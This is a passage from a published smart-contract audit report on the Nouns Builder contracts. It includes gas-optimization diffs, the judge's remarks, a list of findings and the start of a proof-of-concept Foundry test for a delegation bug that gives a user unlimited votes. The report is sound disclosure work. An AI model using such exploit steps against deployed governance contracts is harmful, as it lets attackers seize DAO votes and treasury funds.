class=\"grvsc-source\"><span class=\"mtk1\">251, 249:         uint256 _support,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">252, 250:         string memory _reason</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 253     :-    ) internal returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      251:+    ) internal returns (uint256 weight) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">254, 252:         // Ensure voting is active</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">255, 253:         if (state(_proposalId) != ProposalState.Active) revert VOTING_NOT_STARTED();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">256, 254:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -266,9 +264,6 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">266, 264:         // Get the pointer to the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">267, 265:         Proposal storage proposal = proposals[_proposalId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">268, 266:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 269     :-        // Used to store the voter&#39;s weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 270     :-        uint256 weight;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 271     :-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">272, 267:         // Cannot realistically underflow and `getVotes` would revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">273, 268:         unchecked {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">274, 269:             // Get the voter&#39;s weight at the time the proposal was created</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -292,8 +287,6 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">292, 287:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">293, 288:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">294, 289:         emit VoteCast(_voter, _proposalId, _support, weight, _reason);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 295     :-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 296     :-        return weight;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">297, 290:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">298, 291:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">299, 292:     ///                                                          ///</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -326,9 +319,9 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">326, 319:         uint256[] calldata _values,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">327, 320:         bytes[] calldata _calldatas,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">328, 321:         bytes32 _descriptionHash</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 329     :-    ) external payable returns (bytes32) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      322:+    ) external payable returns (bytes32 proposalId) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">330, 323:         // Get the proposal id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 331     :-        bytes32 proposalId = hashProposal(_targets, _values, _calldatas, _descriptionHash);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      324:+        proposalId = hashProposal(_targets, _values, _calldatas, _descriptionHash);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">332, 325:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">333, 326:         // Ensure the proposal is queued</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">334, 327:         if (state(proposalId) != ProposalState.Queued) revert PROPOSAL_NOT_QUEUED(proposalId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -340,8 +333,6 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">340, 333:         settings.treasury.execute{ value: msg.value }(_targets, _values, _calldatas, _descriptionHash);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">341, 334:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">342, 335:         emit ProposalExecuted(proposalId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 343     :-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 344     :-        return proposalId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">345, 336:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">346, 337:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">347, 338:     ///                                                          ///</span></span></span></code></pre>\n<h2 id=\"overall-gas-saved\" style=\"position:relative;\"><a href=\"#overall-gas-saved\" aria-label=\"overall gas saved permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overall Gas Saved</h2>\n<p>This is the result of merging all the fixes:</p>\n<p>Deployment Gas Saved: <strong>341 027</strong><br>\nMethod Call Gas Saved: <strong>10 231</strong><br>\n<code>forge snapshot --diff</code>: <strong>73 132</strong> Gas Saved</p>\n<p><em>Note: for complete details, please see warden’s <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/133\">full report</a>.</em></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/133#issuecomment-1250345793\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>This looks really good. 10k gas seems a little exaggerated but I will review in detail.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/133#issuecomment-1258618390\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Math looks right, will reduce to 8000 gas as I have used heuristics for other reports.</p>\n<p>Best submission this contest, well done!</p>\n</blockquote>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk6 { color: #D7BA7D; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-5\">High Risk Findings (5)</a></p>\n<ul>\n<li><a href=\"#h-01-user-can-get-unlimited-votes\">[H-01] User can get unlimited votes</a></li>\n<li><a href=\"#h-02-erc721votess-delegation-disables-nft-transfers-and-burning\">[H-02] ERC721Votes’s delegation disables NFT transfers and burning</a></li>\n<li><a href=\"#h-03-multiple-vote-checkpoints-per-block-will-lead-to-incorrect-vote-accounting\">[H-03] Multiple vote checkpoints per block will lead to incorrect vote accounting</a></li>\n<li><a href=\"#h-04-erc721votes-token-owners-can-double-voting-power-through-self-delegation\">[H-04] <code>ERC721Votes</code>: Token owners can double voting power through self delegation</a></li>\n<li><a href=\"#h-05-_transferfrom-can-be-used-to-indefinitely-increase-voting-power\">[H-05] <code>_transferFrom()</code> can be used to indefinitely increase voting power</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-28\">Medium Risk Findings (28)</a></p>\n<ul>\n<li><a href=\"#m-01-quorum-votes-have-no-effect-for-determining-whether-proposal-is-defeated-or-succeeded-when-token-supply-is-low\">[M-01] Quorum votes have no effect for determining whether proposal is defeated or succeeded when token supply is low</a></li>\n<li><a href=\"#m-02-highest-bid-in-first-auction-can-get-irretrievably-stuck-in-the-protocol\">[M-02] Highest bid in first auction can get irretrievably stuck in the protocol</a></li>\n<li><a href=\"#m-03-tokenmint-infinite-loop-if-the-founders-shares-sum-up-to-100\">[M-03] <code>Token:mint</code>: infinite loop if the founders’ shares sum up to 100</a></li>\n<li><a href=\"#m-04-founders-can-receive-less-tokens-that-expected\">[M-04] Founders can receive less tokens that expected</a></li>\n<li><a href=\"#m-05-a-proposal-can-be-cancelled-by-anyone-if-the-proposal-has-exactly-proposalthreshold-votes\">[M-05] A proposal can be cancelled by anyone if the proposal has exactly proposalThreshold votes</a></li>\n<li><a href=\"#m-06-proposals-can-be-bricked-and-auctions-stalled-by-bad-settings\">[M-06] Proposals can be bricked and Auctions stalled by bad settings</a></li>\n<li><a href=\"#m-07-nft-owner-can-block-token-burning-and-transfer-by-delegating-to-zero-address\">[M-07] NFT owner can block token burning and transfer by delegating to zero address</a></li>\n<li><a href=\"#m-08-delegation-should-not-be-allowed-to-address0\">[M-08] Delegation should not be allowed to address(0)</a></li>\n<li><a href=\"#m-09-index-out-of-bounds-error-when-properties-length-is-more-than-attributes-length-breaks-minting\">[M-09] Index out of bounds error when properties length is more than attributes length breaks minting</a></li>\n<li><a href=\"#m-10-the-quorum-votes-calculations-dont-take-into-account-burned-tokens\">[M-10] The quorum votes calculations don’t take into account burned tokens</a></li>\n<li><a href=\"#m-11-loss-of-veto-power-can-lead-to-51-attack\">[M-11] Loss of Veto Power can Lead to 51% Attack</a></li>\n<li><a href=\"#m-12-try-catch-block-at-auction_createauction-will-only-catch-string-errors\">[M-12] Try-catch block at <code>Auction._createAuction()</code> will only catch string errors</a></li>\n<li><a href=\"#m-13-compromised-or-malicious-vetoer-can-veto-any-proposals-with-unrestricted-power\">[M-13] Compromised or malicious vetoer can veto any proposals with unrestricted power</a></li>\n<li><a href=\"#m-14-creating-a-new-governance-proposal-can-be-prevented-by-anyone\">[M-14] Creating a new governance proposal can be prevented by anyone</a></li>\n<li><a href=\"#m-15-malicious-pausing-the-contract\">[M-15] Malicious pausing the contract</a></li>\n<li><a href=\"#m-16-auction-parameters-can-be-changed-during-ongoing-auction\">[M-16] Auction parameters can be changed during ongoing auction</a></li>\n<li><a href=\"#m-17-a-proposal-can-pass-with-0-votes-in-favor-at-early-dao-stages\">[M-17] A proposal can pass with 0 votes in favor at early DAO stages</a></li>\n<li><a href=\"#m-18-precision-is-not-enough-for-proposalthreshold-and-quorum-collections-with-at-least-20000-nfts-in-total-supply-may-have-some-trouble\">[M-18] Precision is not enough for <code>proposalThreshold</code> and quorum. Collections with at least 20000 NFTs in total supply may have some trouble.</a></li>\n<li><a href=\"#m-19-governor---quorum-could-be-less-than-intended\">[M-19] <code>Governor</code> - Quorum could be less than intended</a></li>\n<li><a href=\"#m-20-attackers-can-increase-voting-power-by-incentivizing\">[M-20] Attackers can increase voting power by incentivizing</a></li>\n<li><a href=\"#m-21-truncation-in-casting-can-lead-to-a-founder-receiving-all-the-base-tokens\">[M-21] Truncation in casting can lead to a founder receiving all the base tokens</a></li>\n<li><a href=\"#m-22-owners-receive-more-percentage-of-total-nft-if-some-nfts-were-burnedbecause-were-not-sold\">[M-22] Owners receive more percentage of total nft if some nfts were burned(because were not sold)</a></li>\n<li><a href=\"#m-23-changing-treasury-owner-through-transferownership-can-break-governersol-and-auctionsol\">[M-23] Changing treasury owner through <code>transferOwnership()</code> can break <code>Governer.sol</code> and <code>Auction.sol</code></a></li>\n<li><a href=\"#m-24-token-founder-percentages-not-always-respected\">[M-24] Token: Founder percentages not always respected</a></li>\n<li><a href=\"#m-25-metadatarenderer-contract-raise-error-when-minting\">[M-25] MetadataRenderer contract raise error when minting</a></li>\n<li><a href=\"#m-26-minting-is-not-possible-when-a-property-has-no-items\">[M-26] Minting is not possible when a property has no items</a></li>\n<li><a href=\"#m-27-tokens-without-properties-can-be-minted-and-cannot-be-rendered\">[M-27] Tokens without properties can be minted and cannot be rendered</a></li>\n<li><a href=\"#m-28-state-function-does-not-require-majority-of-votes-for-supporting-and-passing-a-proposal\">[M-28] State function does not require majority of votes for supporting and passing a proposal</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#01\">01</a></li>\n<li><a href=\"#02\">02</a></li>\n<li><a href=\"#03\">03</a></li>\n<li><a href=\"#04\">04</a></li>\n<li><a href=\"#05\">05</a></li>\n<li><a href=\"#06\">06</a></li>\n<li><a href=\"#07\">07</a></li>\n<li><a href=\"#08\">08</a></li>\n<li><a href=\"#09\">09</a></li>\n<li><a href=\"#10\">10</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#summary-1\">Summary</a></li>\n<li><a href=\"#g-01-storage-pointer-to-a-structure-is-cheaper-than-copying-each-value-of-the-structure-into-memory-same-for-array-and-mapping-5-instances\">G-01 <code>storage</code> pointer to a structure is cheaper than copying each value of the structure into <code>memory</code>, same for <code>array</code> and <code>mapping</code> (5 instances)</a></li>\n<li><a href=\"#g-02-state-variables-can-be-packed-into-fewer-storage-slots-1-instances\">G-02 State variables can be packed into fewer storage slots (1 instances)</a></li>\n<li><a href=\"#g-03-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage-5-instances\">G-03 State variables should be cached in stack variables rather than re-reading them from storage (5 instances)</a></li>\n<li><a href=\"#g-04-using-bools-for-storage-incurs-overhead-5-instances\">G-04 Using bools for storage incurs overhead (5 instances)</a></li>\n<li><a href=\"#g-05-storage-variable-is-used-when-local-exists-2-instances\">G-05 Storage variable is used when local exists (2 instances)</a></li>\n<li><a href=\"#g-06-use-named-returns-where-appropriate-3-instances\">G-06 Use named returns where appropriate (3 instances)</a></li>\n<li><a href=\"#overall-gas-saved\">Overall Gas Saved</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>",
  "md": "\n# Overview\n\n## About C4\n\nCode4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.\n\nA C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\n\nDuring the audit contest outlined in this document, C4 conducted an analysis of the Nouns Builder smart contract system written in Solidity. The audit contest took place between September 6—September 15 2022.\n\n## Wardens\n\n176 Wardens contributed reports to the Nouns Builder contest:\n\n  1. [hyh](https://twitter.com/0xhyh)\n  1. rvierdiiev\n  1. [Chom](https://chom.dev)\n  1. scaraven\n  1. [Jeiwan](https://jeiwan.net)\n  1. PwnPatrol ([obront](https://twitter.com/zachobront) and [throttle](https://twitter.com/Throt7le))\n  1. davidbrai\n  1. 0xA5DF\n  1. [Tomo](https://tom-sol.notion.site/Who-am-I-3b4dc28e77b647eb90794735a94dd38e)\n  1. [Migue](https://twitter.com/angel_tripi)\n  1. V\\_B (Barichek and vlad\\_bochok)\n  1. [Ch\\_301](https://twitter.com/0xch301)\n  1. rbserver\n  1. Lambda\n  1. Soosh\n  1. CertoraInc (egjlmn1, [OriDabush](https://twitter.com/ori_dabush), ItayG, shakedwinder, and RoiEvenHaim)\n  1. [Picodes](https://twitter.com/thePicodes)\n  1. arcoun\n  1. Solimander\n  1. [pauliax](https://twitter.com/SolidityDev)\n  1. [berndartmueller](https://twitter.com/berndartmueller)\n  1. ayeslick\n  1. R2\n  1. [bin2chen](https://twitter.com/bin2chen)\n  1. [pfapostol](https://t.me/pfahard)\n  1. cccz\n  1. [csanuragjain](https://twitter.com/csanuragjain)\n  1. m9800\n  1. \\_\\_141345\\_\\_\n  1. [MiloTruck](https://milotruck.github.io/)\n  1. [MEP](https://twitter.com/meppent)\n  1. [izhuer](https://www.cs.purdue.edu/homes/zhan3299/index.html)\n  1. ladboy233\n  1. imare\n  1. zkhorse ([karmacoma](twitter.com/0xkarmacoma) and horsefacts)\n  1. pashov\n  1. [0xSmartContract](https://twitter.com/0xSmartContract)\n  1. 0xSky\n  1. [pcarranzav](https://twitter.com/pcarranzav)\n  1. sorrynotsorry\n  1. 0x52\n  1. 0x4non\n  1. [Deivitto](https://twitter.com/Deivitto)\n  1. dipp\n  1. azephiar\n  1. hxzy\n  1. [Aymen0909](https://github.com/Aymen1001)\n  1. volky\n  1. Tointer\n  1. cryptphi\n  1. [joestakey](https://twitter.com/JoeStakey)\n  1. simon135\n  1. rotcivegaf\n  1. saian\n  1. [elprofesor](https://twitter.com/kamensec)\n  1. zzzitron\n  1. [indijanc](https://twitter.com/krenkmet)\n  1. pedr02b2\n  1. yixxas\n  1. [TomJ](https://mobile.twitter.com/tomj_bb)\n  1. datapunk\n  1. elad\n  1. [fatherOfBlocks](https://twitter.com/father0fBl0cks)\n  1. GimelSec ([rayn](https://twitter.com/rayn731) and sces60107)\n  1. [hansfriese](https://twitter.com/hansfriese)\n  1. \\_Adam\n  1. 0x1f8b\n  1. 0xc0ffEE\n  1. CodingNameKiki\n  1. [c3phas](https://twitter.com/c3ph_)\n  1. ak1\n  1. ChristianKuri\n  1. brgltd\n  1. [gogo](https://www.linkedin.com/in/georgi-nikolaev-georgiev-978253219)\n  1. tonisives\n  1. peritoflores\n  1. ReyAdmirado\n  1. [ElKu](https://twitter.com/ElKu_crypto)\n  1. Rolezn\n  1. leosathya\n  1. [oyc\\_109](https://twitter.com/andyfeili)\n  1. RaymondFam\n  1. djxploit\n  1. Waze\n  1. [martin](https://github.com/martin-petrov03)\n  1. robee\n  1. [Respx](https://twitter.com/RespxR)\n  1. asutorufos\n  1. Bnke0x0\n  1. ch0bu\n  1. PPrieditis\n  1. bulej93\n  1. [ret2basic](https://twitter.com/ret2basic)\n  1. ballx\n  1. lucacez\n  1. sikorico\n  1. Samatak\n  1. [Franfran](https://franfran.dev/)\n  1. PaludoX0\n  1. [dharma09](https://twitter.com/im_Dharma09)\n  1. wagmi\n  1. eierina\n  1. [0xNazgul](https://twitter.com/0xNazgul)\n  1. LeoS\n  1. chatch\n  1. d3e4\n  1. neumo\n  1. minhtrng\n  1. 0x1337\n  1. B2\n  1. erictee\n  1. ne0n\n  1. [8olidity](https://twitter.com/8olidity)\n  1. [jonatascm](https://twitter.com/jonataspvt)\n  1. 0x85102\n  1. sahar\n  1. EthLedger\n  1. lukris02\n  1. cryptostellar5\n  1. Jujic\n  1. sach1r0\n  1. [bharg4v](https://twitter.com/Bharg4v)\n  1. Captainkay\n  1. cryptonue\n  1. [JansenC](https://www.linkedin.com/in/jansen-moreira/?locale&#x3D;en_US)\n  1. slowmoses\n  1. tnevler\n  1. bobirichman\n  1. cloudjunky\n  1. Diana\n  1. [Funen](https://instagram.com/vanensurya)\n  1. 0xbepresent\n  1. [a12jmx](https://twitter.com/a12jmx)\n  1. delfin454000\n  1. DimitarDimitrov\n  1. MasterCookie\n  1. Noah3o6\n  1. p\\_crypt0\n  1. CRYP70\n  1. dic0de\n  1. Lead\\_Belly\n  1. [Randyyy](https://twitter.com/randyyramadhan)\n  1. SnowMan\n  1. [antonttc](https://github.com/antoncoding)\n  1. easy\\_peasy\n  1. Saintcode\\_\n  1. JAGADESH\n  1. immeas\n  1. DimSon\n  1. WatchDogs\n  1. [rfa](https://www.instagram.com/riyan_rfa/)\n  1. [JC](https://twitter.com/sm4rtcontr4ct)\n  1. Matin\n  1. [tofunmi](https://twitter.com/dediranTofunmi)\n  1. gianganhnguyen\n  1. [prasantgupta52](https://twitter.com/prasantgupta52)\n  1. StevenL\n  1. [durianSausage](https://github.com/lyciumlee)\n  1. Cr4ckM3\n  1. Metatron\n  1. 0xkatana\n  1. [Chandr](https://www.linkedin.com/in/evgeniy-shaldin-21898712a/)\n  1. [zishansami](https://zishansami102.github.io/)\n  1. 0x5rings\n  1. peiw\n  1. ajtra\n  1. [teawaterwire](https://twitter.com/teawaterwire)\n  1. unforgiven\n\nThis contest was judged by [Alex the Entreprenerd](https://twitter.com/GalloDaSballo).\n\nFinal report assembled by [liveactionllama](https://twitter.com/liveactionllama).\n\n# Summary\n\nThe C4 analysis yielded an aggregated total of 33 unique vulnerabilities. Of these vulnerabilities, 5 received a risk rating in the category of HIGH severity and 28 received a risk rating in the category of MEDIUM severity. Per Nouns Builder, all of these HIGH and MEDIUM severity findings have been addressed as of [this commit](https://github.com/ourzora/nouns-protocol/commit/dcfd8bcd1b33c05601c9e9244fc479130ba0d378).\n\nAdditionally, C4 analysis included 124 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 75 reports recommending gas optimizations.\n\nAll of the issues presented here are linked back to their original finding.\n\n# Scope\n\nThe code under review can be found within the [C4 Nouns Builder contest repository](https://github.com/code-423n4/2022-09-nouns-builder), and is composed of 46 smart contracts written in the Solidity programming language and includes 4,046 lines of Solidity code.\n\n# Severity Criteria\n\nC4 assesses the severity of disclosed vulnerabilities according to a methodology based on [OWASP standards](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology).\n\nVulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.\n\nHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\n\n- Malicious Input Handling\n- Escalation of privileges\n- Arithmetic\n- Gas use\n\nFurther information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com).\n\n# High Risk Findings (5)\n## [[H-01] User can get unlimited votes](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/469)\n*Submitted by saian, also found by 0x4non, Ch\\_301, davidbrai, izhuer, MEP, Picodes, PwnPatrol, R2, rotcivegaf, scaraven, and Soosh*\n\n`aftertokenTransfer` in ERC721Votes transfers votes between user addresses instead of the delegated addresses, so a user can cause overflow in `_moveDelegates` and get unlimited votes.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268>\n\n        function _afterTokenTransfer(\n            address _from,\n            address _to,\n            uint256 _tokenId\n        ) internal override {\n            // Transfer 1 vote from the sender to the recipient\n            _moveDelegateVotes(_from, _to, 1);\n\n            super._afterTokenTransfer(_from, _to, _tokenId);\n        }\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L216>\n\n        _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));\n        ...\n        unchecked {\n                    ...\n                    // Update their voting weight\n                    _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);\n                }\n\nDuring delegation `balanceOf(from)` amount of votes transferred are to the `_to` address\n\n        function test_UserCanGetUnlimitedVotes() public {\n\n            vm.prank(founder);\n            auction.unpause();\n\n            vm.prank(bidder1);\n            auction.createBid{ value: 1 ether }(2);\n\n            vm.warp(10 minutes + 1 seconds);\n\n            auction.settleCurrentAndCreateNewAuction();\n            \n            assertEq(token.ownerOf(2), bidder1);\n\n            console.log(token.getVotes(bidder1)); // 1\n            console.log(token.delegates(bidder1)); // 0 bidder1\n\n            vm.prank(bidder1);\n            token.delegate(bidder2);\n\n            console.log(token.getVotes(bidder1)); // 1\n            console.log(token.getVotes(bidder2)); // 